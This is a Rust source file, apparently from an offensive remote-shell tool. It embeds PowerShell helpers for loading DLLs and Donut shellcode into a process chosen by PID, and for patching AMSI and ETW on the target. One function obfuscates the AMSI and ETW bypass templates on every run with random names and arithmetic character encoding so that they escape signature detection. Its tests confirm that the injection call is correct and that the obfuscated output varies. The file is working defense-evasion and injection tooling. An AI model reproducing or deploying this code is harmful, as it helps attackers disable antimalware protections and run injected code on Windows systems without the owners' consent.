//! Embedded upstream PowerShell helpers. See THIRD_PARTY_NOTICES.md.
use crate::session::Session;
use anyhow::{Context, Result};

const DLL: &str = include_str!("../assets/powershell/dll_loader.ps1");
const DONUT: &str = include_str!("../assets/powershell/donut_loader.ps1");
const AMSI: &str = include_str!("../assets/powershell/amsi_template.ps1");
const ETW: &str = include_str!("../assets/powershell/etw_template.ps1");

fn instantiate(template: &str) -> Result<String> {
    let mut text = template.to_owned();
    for n in (1..=12).rev() {
        text = text.replace(
            &format!(">><FUNCTION{n}>><"),
            &format!("Get-Ewr{}", uuid::Uuid::new_v4().simple()),
        );
        text = text.replace(
            &format!(">><VAR{n}>><"),
            &format!("$ewr{}", uuid::Uuid::new_v4().simple()),
        );
    }
    // Preserve the upstream template's string-expression semantics while
    // generating a fresh arithmetic character expression for each invocation.
    while let Some(start) = text.find("<><") {
        let end = start
            + 3
            + text[start + 3..]
                .find("<><")
                .context("unclosed helper template marker")?;
        let expression = text[start + 3..end]
            .chars()
            .map(|c| {
                let nonce = uuid::Uuid::new_v4().as_u128() as u16 as u32;
                format!("[char]({}-{})", u32::from(c) + nonce, nonce)
            })
            .collect::<Vec<_>>()
            .join("+");
        text.replace_range(start..end + 3, &expression);
    }
    Ok(text)
}

pub async fn install_dll_loader(session: &Session) -> Result<()> {
    session.raw(&format!(". {{\n{DLL}\n}}")).await?;
    Ok(())
}
pub async fn install_donut_loader(session: &Session) -> Result<()> {
    session.raw(&format!(". {{\n{DONUT}\n}}")).await?;
    Ok(())
}
pub async fn patch_amsi(session: &Session) -> Result<String> {
    let mut output = String::new();
    for part in instantiate(AMSI)?.split("#jump") {
        output.push_str(&session.raw(part).await?);
    }
    Ok(output)
}
pub async fn patch_amsi_and_etw(session: &Session) -> Result<String> {
    let mut output = patch_amsi(session).await?;
    output.push_str(&patch_etw(session).await?);
    Ok(output)
}
pub async fn patch_etw(session: &Session) -> Result<String> {
    session.raw(&instantiate(ETW)?).await
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn donut_loader_uses_inject_with_the_requested_pid() {
        // The embedded loader's Main() ignores its PID argument, so the helper
        // must call Inject directly.
        assert!(DONUT.contains("::Inject($donutfile, $donutfile, [int]$process_id)"));
        assert!(!DONUT.contains("::Main($array)"));
    }

    #[test]
    fn all_helper_placeholders_expand_and_vary() {
        for template in [AMSI, ETW] {
            let first = instantiate(template).unwrap();
            assert!(!first.contains("<><") && !first.contains(">><"));
            assert_ne!(first, instantiate(template).unwrap());
        }
    }

    #[test]
    #[ignore = "requires pwsh; parses helper scripts without executing them"]
    fn generated_helpers_parse_in_powershell() {
        let directory = tempfile::tempdir().unwrap();
        let mut scripts = vec![DLL.to_owned(), DONUT.to_owned(), instantiate(ETW).unwrap()];
        scripts.extend(instantiate(AMSI).unwrap().split("#jump").map(str::to_owned));
        for (index, script) in scripts.into_iter().enumerate() {
            std::fs::write(directory.path().join(format!("helper-{index}.ps1")), script).unwrap();
        }
        let command = format!(
            "$failed=$false; Get-ChildItem -LiteralPath {} -Filter '*.ps1' | ForEach-Object {{ $errors=$null; $null=[System.Management.Automation.Language.Parser]::ParseFile($_.FullName,[ref]$null,[ref]$errors); if ($errors) {{ $errors | Out-String | Write-Error; $failed=$true }} }}; if ($failed) {{ exit 1 }}",
            crate::command::quote(directory.path().to_str().unwrap())
        );
        let output = std::process::Command::new("pwsh")
            .args(["-NoLogo", "-NoProfile", "-Command", &command])
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
    }
}
